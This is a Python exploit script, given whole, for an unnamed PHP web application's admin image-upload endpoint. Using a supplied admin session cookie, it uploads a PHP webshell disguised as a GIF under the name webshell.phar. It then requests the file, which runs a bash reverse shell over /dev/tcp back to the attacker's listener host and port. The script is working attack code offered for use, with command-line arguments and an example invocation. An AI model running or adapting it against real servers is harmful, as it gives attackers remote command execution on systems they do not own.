import requests
from urllib.parse import urljoin
import traceback
import argparse

def uploadWebShell(target, session, lhost, lport):

    url = urljoin(target, "/admin/upload_image.php")
    cookies = {
        "PHPSESSID": session
        }
    headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryL4P978xGPN1dq3ta", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36"}
    data = f"------WebKitFormBoundaryL4P978xGPN1dq3ta\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\ndummy\r\n------WebKitFormBoundaryL4P978xGPN1dq3ta\r\nContent-Disposition: form-data; name=\"image\"; filename=\"webshell.phar\"\r\nContent-Type: image/gif\r\n\r\nGIF8\r\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>\r\n------WebKitFormBoundaryL4P978xGPN1dq3ta--\r\n"
    try:
        print("[*] Uploading the webshell...")
        response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)
        if "Success" in response.text:
            webShellUrl = urljoin(target, "/images/webshell.phar")
            print("[+] Webshell uploaded successfully. Check your listener!")
            print(f"[+] Webshell: ", webShellUrl)
            try:
                requests.get(webShellUrl)
            except Exception as e:
                print("[-] Failed to trigger the webshell: ", e)
                traceback.print_exc()
        else:
            print("[-] Failed to upload the webshell")
    except Exception as e:
        print("[-] Error: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Upload webshell to the target machine")
    parser.add_argument("target", help="Target URL (e.g, http://localhost:8080)")
    parser.add_argument("session", help="Valid admin account session token")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    uploadWebShell(args.target, args.session, args.lhost, args.lport)

    # Example Usage:
    # python3 image_upload.py http://localhost:8080 gnd8fkg0vadqu08nlsb603c306 192.168.1.5 1234

if __name__ == "__main__":
    main()
